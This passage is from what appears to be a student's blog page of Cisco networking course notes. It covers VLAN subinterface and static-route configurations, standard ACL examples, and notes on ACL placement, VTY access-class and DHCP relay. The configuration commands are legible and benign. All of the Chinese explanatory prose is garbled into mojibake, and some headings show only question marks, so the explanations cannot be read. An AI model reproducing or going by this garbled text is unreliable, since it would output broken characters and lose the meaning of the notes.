class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.10</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation  dot1Q <span class="hljs-number">10</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.20</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.20</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation d<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">20</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.30</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">30</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.88</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">88</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">88.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.99</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">99</span> native  ## native!!!!!!!<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">99.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><br><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Sales<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Production<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Marketing<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">88</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Native<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> vlan <span class="hljs-number">88</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">88.33</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#ip default-gateway <span class="hljs-number">172.31</span>.<span class="hljs-number">88.1</span><br><span class="hljs-built_in">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw m trunk <br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw trunk native vlan <span class="hljs-number">99</span><br><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">20.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">30.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">88.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">209.165</span>.<span class="hljs-number">200.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span> Serial0/<span class="hljs-number">1</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">209.165</span>.<span class="hljs-number">200.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span> Serial0/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h2 id="7-4-1-2"><a href="#7-4-1-2" class="headerlink" title="7.4.1.2 ??????"></a>7.4.1.2 ??????</h2><p>1.1.11100000.00000000</p><p>172.16.224</p><p>192~254</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hostname</span> Branch<br>!<br>interface GigabitEthernet0/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">172.16.159.254</span> <span class="hljs-number">255.255.240.0</span><br>ip access-group HQServer in<br><span class="hljs-literal">no</span> shut<br>!<br>interface GigabitEthernet0/<span class="hljs-number">1</span><br>ip address <span class="hljs-number">172.16.143.254</span> <span class="hljs-number">255.255.240.0</span><br><span class="hljs-literal">no</span> shut<br>!<br>interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">192.168.0.2</span> <span class="hljs-number">255.255.255.252</span><br><span class="hljs-literal">no</span> shut<br>!<br>router rip<br>version <span class="hljs-number">2</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">0</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">1</span><br>network <span class="hljs-number">172.16.0.0</span><br>network <span class="hljs-number">192.168.0.0</span><br><span class="hljs-literal">no</span> auto-summary<br>!<br>ip access-list standard HQServer<br>deny <span class="hljs-number">172.16.128.0</span> <span class="hljs-number">0.0.31.255</span><br>permit any<br><br><br><br>hostname HQ<br>!<br>interface GigabitEthernet0/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">172.16.127.254</span> <span class="hljs-number">255.255.192.0</span><br>ip access-group BranchServer in<br><span class="hljs-literal">no</span> shut<br>!<br>interface GigabitEthernet0/<span class="hljs-number">1</span><br>ip address <span class="hljs-number">172.16.63.254</span> <span class="hljs-number">255.255.192.0</span><br><span class="hljs-literal">no</span> shut<br>!<br>interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">192.168.0.1</span> <span class="hljs-number">255.255.255.252</span><br><span class="hljs-literal">no</span> shut<br>!<br>interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>ip address <span class="hljs-number">64.104.34.2</span> <span class="hljs-number">255.255.255.252</span><br><span class="hljs-literal">no</span> shut<br>!<br>router rip<br>version <span class="hljs-number">2</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">0</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">1</span><br>passive-interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>network <span class="hljs-number">172.16.0.0</span><br>network <span class="hljs-number">192.168.0.0</span><br>default-information originate<br><span class="hljs-literal">no</span> auto-summary<br>!<br>ip route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>!<br>ip access-list standard BranchServer<br>deny <span class="hljs-number">172.16.64.0</span> <span class="hljs-number">0.0.63.255</span><br>permit any<br></code></pre></td></tr></table></figure><h2 id="5-27"><a href="#5-27" class="headerlink" title="5/27"></a>5/27</h2><h3 id="7-1-1-3-ACL"><a href="#7-1-1-3-ACL" class="headerlink" title="7.1.1.3 ACL"></a>7.1.1.3 ACL</h3><ul><li><strong>å…¥ç«™ ACL</strong> - ä¼ å…¥æ•°æ®åŒ…ç»è¿‡å¤„ç†ä¹‹åæ‰ä¼šè¢«è·¯ç”±åˆ°å‡ºç«™æ¥å£ã€‚å› ä¸ºå¦‚æœæ•°æ®åŒ…è¢«ä¸¢å¼ƒï¼Œå°±<strong>èŠ‚çœäº†æ‰§è¡Œè·¯ç”±æŸ¥æ‰¾</strong>çš„å¼€é”€ï¼Œæ‰€ä»¥å…¥ç«™ ACL éå¸¸é«˜æ•ˆã€‚å¦‚æœ ACL å…è®¸è¯¥æ•°æ®åŒ…ï¼Œåˆ™ä¼šå¤„ç†è¯¥æ•°æ®åŒ…ä»¥è¿›è¡Œè·¯ç”±ã€‚å½“ä¸å…¥ç«™æ¥å£è¿æ¥çš„ç½‘ç»œæ˜¯éœ€è¦æ£€æµ‹çš„æ•°æ®åŒ…çš„å”¯ä¸€æ¥æºæ—¶ï¼Œæœ€é€‚åˆä½¿ç”¨å…¥ç«™ ACL æ¥è¿‡æ»¤æ•°æ®åŒ…ã€‚(ä¸€è¿›å¤šå‡º)</li><li><strong>å‡ºç«™ ACL</strong> - ä¼ å…¥æ•°æ®åŒ…è·¯ç”±åˆ°å‡ºç«™æ¥å£åï¼Œç”±å‡ºç«™ ACL è¿›è¡Œå¤„ç†ã€‚<strong>åœ¨æ¥è‡ªå¤šä¸ªå…¥ç«™æ¥å£çš„æ•°æ®åŒ…é€šè¿‡åŒä¸€å‡ºç«™æ¥å£ä¹‹å‰ï¼Œå¯¹æ•°æ®åŒ…åº”ç”¨ç›¸åŒè¿‡æ»¤å™¨æ—¶ï¼Œæœ€é€‚åˆä½¿ç”¨å‡ºç«™ ACLã€‚</strong>ï¼ˆå¤šè¿›ä¸€å‡ºï¼‰</li></ul><h3 id="7-1-2-5"><a href="#7-1-2-5" class="headerlink" title="7.1.2.5"></a>7.1.2.5</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">access-list <span class="hljs-number">1</span> permit any<br>!OR<br>access-list <span class="hljs-number">1</span> permit <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">255.255.255.255</span><br><br>access-list <span class="hljs-number">1</span> permit <span class="hljs-number">192.168.10.10</span> <span class="hljs-number">0.0.0.0</span><br>!OR<br>access-list <span class="hljs-number">1</span> permit host <span class="hljs-number">192.168.10.10</span><br></code></pre></td></tr></table></figure><p><strong>åº”ç”¨ ACL çš„è§„åˆ™</strong></p><p>ä¸€äº›ä½¿ç”¨ ACL çš„æŒ‡å¯¼åŸåˆ™ï¼š</p><ul><li><p>åœ¨ä½äºå†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œï¼ˆä¾‹å¦‚äº’è”ç½‘ï¼‰äº¤ç•Œå¤„çš„é˜²ç«å¢™è·¯ç”±å™¨ä¸Šä½¿ç”¨ ACLã€‚</p></li><li><p>åœ¨ä½äºç½‘ç»œä¸¤ä¸ªéƒ¨åˆ†äº¤ç•Œå¤„çš„è·¯ç”±å™¨ä¸Šä½¿ç”¨ ACLï¼Œä»¥æ§åˆ¶è¿›å‡ºå†…éƒ¨ç½‘ç»œç‰¹å®šéƒ¨åˆ†çš„æµé‡ã€‚</p></li><li><p>åœ¨è¾¹ç•Œè·¯ç”±å™¨ï¼ˆå³ä½äºç½‘ç»œè¾¹ç•Œçš„è·¯ç”±å™¨ï¼‰ä¸Šé…ç½® ACLã€‚è¿™æ ·å¯ä»¥åœ¨å†…å¤–éƒ¨ç½‘ç»œä¹‹é—´ï¼Œæˆ–ç½‘ç»œä¸­å—æ§åº¦è¾ƒä½çš„åŒºåŸŸä¸æ•æ„ŸåŒºåŸŸä¹‹é—´èµ·åˆ°åŸºæœ¬çš„ç¼“å†²ä½œç”¨ã€‚</p></li><li><p>ä¸ºè¾¹ç•Œè·¯ç”±å™¨æ¥å£ä¸Šé…ç½®çš„æ¯ç§ç½‘ç»œåè®®é…ç½® ACLã€‚</p></li></ul><p>ä¸ºæ¯ç§åè®® (per protocol)ã€æ¯ä¸ªæ–¹å‘ (per direction)ã€æ¯ä¸ªæ¥å£ (per interface) é…ç½®ä¸€ä¸ª ACLï¼š</p><ul><li><p><strong>æ¯ç§åè®®ä¸€ä¸ª ACL</strong> - è¦æ§åˆ¶æ¥å£ä¸Šçš„æµé‡ï¼Œå¿…é¡»ä¸ºæ¥å£ä¸Šå¯ç”¨çš„æ¯ç§åè®®å®šä¹‰ç›¸åº”çš„ ACLã€‚</p></li><li><p><strong>æ¯ä¸ªæ–¹å‘ä¸€ä¸ª ACL</strong> - ä¸€ä¸ª ACL åªèƒ½æ§åˆ¶æ¥å£ä¸Šä¸€ä¸ªæ–¹å‘çš„æµé‡ã€‚è¦æ§åˆ¶å…¥ç«™æµé‡å’Œå‡ºç«™æµé‡ï¼Œå¿…é¡»åˆ†åˆ«å®šä¹‰ä¸¤ä¸ª ACLã€‚</p></li><li><p><strong>æ¯ä¸ªæ¥å£ä¸€ä¸ª ACL</strong> - ä¸€ä¸ª ACL åªèƒ½æ§åˆ¶ä¸€ä¸ªæ¥å£ï¼ˆä¾‹å¦‚ GigabitEthernet 0/0ï¼‰ä¸Šçš„æµé‡ã€‚</p></li></ul><h3 id="7-1-4-1-æ‹“å±•aclå’Œæ ‡å‡†çš„ä½¿ç”¨æƒ…å†µ"><a href="#7-1-4-1-æ‹“å±•aclå’Œæ ‡å‡†çš„ä½¿ç”¨æƒ…å†µ" class="headerlink" title="7.1.4.1 æ‹“å±•aclå’Œæ ‡å‡†çš„ä½¿ç”¨æƒ…å†µ??"></a>7.1.4.1 æ‹“å±•aclå’Œæ ‡å‡†çš„ä½¿ç”¨æƒ…å†µ??</h3><p><strong>æ‰©å±• ACL</strong> - å°†æ‰©å±• ACL æ”¾ç½®åœ¨å°½å¯èƒ½é è¿‘éœ€è¦è¿‡æ»¤çš„æµé‡æºçš„ä½ç½®ä¸Šã€‚è¿™æ ·ï¼Œä¸éœ€è¦çš„æµé‡ä¼šåœ¨é è¿‘æºç½‘ç»œçš„ä½ç½®é­åˆ°æ‹’ç»ï¼Œè€Œæ— éœ€é€šè¿‡ç½‘ç»œåŸºç¡€è®¾æ–½ã€‚</p><p><strong>æ ‡å‡† ACL</strong> - ç”±äºæ ‡å‡† ACL ä¸ä¼šæŒ‡å®šç›®æ ‡åœ°å€ï¼Œæ‰€ä»¥å…¶ä½ç½®åº”è¯¥å°½å¯èƒ½é è¿‘ç›®æ ‡ã€‚åœ¨<strong>æµé‡æºé™„è¿‘è®¾ç½®æ ‡å‡† ACL</strong> å¯ä»¥æœ‰æ•ˆé˜»æ­¢æµé‡é€šè¿‡åº”ç”¨äº† ACL çš„æ¥å£åˆ°è¾¾ä»»ä½•å…¶ä»–ç½‘ç»œã€‚</p><p>æ ‡å‡† ACL å‘½ä»¤çš„å®Œæ•´è¯­æ³•å¦‚ä¸‹ï¼š</p><p>Router(config)# <strong>access-list</strong> <em>access-list-number</em> { <strong>deny</strong> | <strong>permit</strong> | <strong>remark</strong> } <em>source</em> [ <em>source-wildcard</em> ] [ <strong>log</strong> ]</p><p>[ <em>source-wildcard</em> ] ï¼ˆå¯é€‰ï¼‰è¦åº”ç”¨åˆ°æºå¾—32ä½é€šé…ç¬¦æ©ç ã€‚åœ¨è¦å¿½ç•¥å¾—ä½ä¸Šç½®1ã€‚</p><h3 id="7-2-1-2"><a href="#7-2-1-2" class="headerlink" title="7.2.1.2"></a>7.2.1.2</h3><p>é…ç½®æ ‡å‡† IPv4 ACL ä¹‹åï¼Œå¯ä»¥åœ¨æ¥å£é…ç½®æ¨¡å¼ä¸‹ä½¿ç”¨ <strong>ip access-group</strong> å‘½ä»¤å°†å…¶å…³è”åˆ°æ¥å£ï¼š</p><p>Router(config-if)# <strong>ip access-group</strong> { <em>access-list-number</em> | <em>access-list-name</em> } { <strong>in</strong> | <strong>out</strong> }</p><p>in/out å…¥ç«™ å‡ºç«™è¿‡æ»¤å™¨</p><h3 id="7-2-1-3"><a href="#7-2-1-3" class="headerlink" title="7.2.1.3"></a>7.2.1.3</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527092034631.png" class="" title="image-20200527092034631"><p>æ‹’ç»ä½äº 192.168.10.10 çš„ä¸»æœº PC1ã€‚ä½†å…è®¸ 192.168.10.0/24 ç½‘ç»œä¸­çš„å…¶ä»–å„å°ä¸»æœºã€‚</p><h3 id="7-2-2-3"><a href="#7-2-2-3" class="headerlink" title="7.2.2.3"></a>7.2.2.3</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527101158208.png" class="" title="image-20200527101158208"><p>show ip interface ç«¯å£</p><h3 id="7-2-3-1"><a href="#7-2-3-1" class="headerlink" title="7.2.3.1"></a>7.2.3.1</h3><p>çº¿è·¯é…ç½®æ¨¡å¼ä¸­é…ç½®çš„ <strong>access-class</strong> å‘½ä»¤å¯é™åˆ¶ç‰¹å®š VTYï¼ˆæ¥å…¥æ€ç§‘è®¾å¤‡ï¼‰ä¸è®¿é—®åˆ—è¡¨ä¸­åœ°å€ä¹‹é—´çš„ä¼ å…¥å’Œä¼ å‡ºè¿æ¥ã€‚</p><p><strong>access-class</strong> å‘½ä»¤çš„è¯­æ³•æ˜¯ï¼š</p><p>Router(config-line)# <strong>access-class</strong> <em>access-list-number</em> { <strong>in</strong> [ <strong>vrf-also</strong> ] | <strong>out</strong> }</p><p>==å‚æ•° <strong>in</strong> é™åˆ¶è®¿é—®åˆ—è¡¨ä¸­çš„åœ°å€å’Œæ€ç§‘è®¾å¤‡ä¹‹é—´çš„ä¼ å…¥è¿æ¥ï¼Œè€Œå‚æ•° <strong>out</strong> åˆ™é™åˆ¶ç‰¹å®šæ€ç§‘è®¾å¤‡ä¸è®¿é—®åˆ—è¡¨ä¸­åœ°å€ä¹‹é—´çš„ä¼ å‡ºè¿æ¥ã€‚==</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527102513372.png" class="" title="image-20200527102513372"><h3 id="7-3-1-2"><a href="#7-3-1-2" class="headerlink" title="7.3.1.2"></a>7.3.1.2</h3><p>æ€ç§‘ IOS å°†åº”ç”¨å†…éƒ¨é€»è¾‘ã€‚å¦‚å‰æ‰€è¿°ï¼ŒACE æ˜¯æŒ‰ç…§é¡ºåºå¤„ç†çš„ï¼›å› æ­¤ï¼ŒACE çš„è¾“å…¥é¡ºåºéå¸¸é‡è¦ã€‚</p><h3 id="8-1-2-1-dhcp"><a href="#8-1-2-1-dhcp" class="headerlink" title="8.1.2.1 dhcp"></a>8.1.2.1 dhcp</h3><p>è¦æ’é™¤ç‰¹å®šåœ°å€ï¼Œè¯·ä½¿ç”¨ <strong>ip dhcp excluded-address</strong> å‘½ä»¤ã€‚</p><p><strong>ip dhcp pool</strong> <em>æ± åç§°</em> å‘½ä»¤åˆ›å»ºå…·æœ‰ç‰¹å®šåç§°çš„åœ°å€æ± ï¼Œå¹¶ä½¿è·¯ç”±å™¨è¿›å…¥ DHCPv4 é…ç½®æ¨¡å¼</p><p>å¿…é¡»é…ç½®åœ°å€æ± å’Œé»˜è®¤ç½‘å…³è·¯ç”±å™¨ã€‚ä½¿ç”¨ <strong>network</strong> è¯­å¥å®šä¹‰å¯ç”¨åœ°å€èŒƒå›´ã€‚</p><p>ä½¿ç”¨ <strong>default-router</strong> å‘½ä»¤å®šä¹‰é»˜è®¤ç½‘å…³è·¯ç”±å™¨ã€‚é€šå¸¸ï¼Œç½‘å…³æ˜¯æœ€æ¥è¿‘å®¢æˆ·ç«¯è®¾å¤‡çš„è·¯ç”±å™¨çš„ LAN æ¥å£ã€‚è™½ç„¶åªéœ€è¦ä¸€ä¸ªç½‘å…³ï¼Œä½†æ˜¯å¦‚æœæœ‰å¤šä¸ªç½‘å…³ï¼Œæ‚¨æœ€å¤šå¯ä»¥åˆ—å‡ºå…«ä¸ªåœ°å€ã€‚</p><p>å…¶ä»– DHCPv4 æ± å‘½ä»¤ä¸ºå¯é€‰å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <strong>dns-server</strong> å‘½ä»¤é…ç½® DHCPv4 å®¢æˆ·ç«¯å¯ç”¨çš„ DNS æœåŠ¡å™¨ IPv4 åœ°å€ã€‚<strong>domain-name</strong> <em>domain</em> å‘½ä»¤ç”¨äºå®šä¹‰åŸŸåã€‚ä½¿ç”¨ <strong>lease</strong> å‘½ä»¤å¯ä»¥æ›´æ”¹ DHCPv4 ç§ŸæœŸã€‚é»˜è®¤ç§Ÿç”¨å€¼ä¸ºä¸€å¤©ã€‚<strong>netbios-name-server</strong> å‘½ä»¤ç”¨äºå®šä¹‰ NetBIOS WINS æœåŠ¡å™¨ã€‚</p><p>è¦ç¦ç”¨æ­¤æœåŠ¡ï¼Œè¯·ä½¿ç”¨ <strong>no service dhcp</strong> å…¨å±€é…ç½®æ¨¡å¼å‘½ä»¤ã€‚ä½¿ç”¨ <strong>service dhcp</strong> å…¨å±€é…ç½®æ¨¡å¼å‘½ä»¤å¯é‡æ–°å¯ç”¨ DHCPv4 æœåŠ¡å™¨è¿›ç¨‹ã€‚å¦‚æœæ²¡æœ‰é…ç½®å‚æ•°ï¼Œå¯ç”¨æœåŠ¡å°†ä¸ä¼šæœ‰æ•ˆæœã€‚</p><h3 id="8-1-2-3-dhcpä¸­ç»§"><a href="#8-1-2-3-dhcpä¸­ç»§" class="headerlink" title="8.1.2.3 dhcpä¸­ç»§"></a>8.1.2.3 dhcpä¸­ç»§</h3><p>å¦‚æœå°† R1 é…ç½®ä¸º DHCPv4 ä¸­ç»§ä»£ç†ï¼Œå®ƒä¼šå°†è¯·æ±‚è½¬å‘è‡³ä½äºå­ç½‘ 192.168.11.0 çš„ DHCPv4 æœåŠ¡å™¨ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R3(<span class="hljs-params">config</span>)</span># interface g0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip helper-address <span class="hljs-number">192.168</span>.<span class="hljs-number">11.6</span><br></code></pre></td></tr></table></figure><h2 id="7-2-1-6"><a href="#7-2-1-6" class="headerlink" title="7.2.1.6"></a>7.2.1.6</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">R2</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> deny <span class="hljs-number">192.168</span>.<span class="hljs-number">11.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-function"><span class="hljs-title">R2</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> permit any<br><br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> deny <span class="hljs-number">192.168</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> permit any<br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> access-group <span class="hljs-number">1</span> out<br></code></pre></td></tr></table></figure><h2 id="7-2-1-7"><a href="#7-2-1-7" class="headerlink" title="7.2.1.7"></a>7.2.1.7</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> access-list standard File_Server_Restrictions<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-std-nacl)</span></span><span class="hljs-selector-id">#permit</span> host <span class="hljs-number">192.168</span>.<span class="hljs-number">20.4</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-std-nacl)</span></span><span class="hljs-selector-id">#deny</span> any<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> access-group File_Server_Restrictions out<br></code></pre></td></tr></table></figure><h2 id="7-2-3-3"><a href="#7-2-3-3" class="headerlink" title="7.2.3.3"></a>7.2.3.3</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code 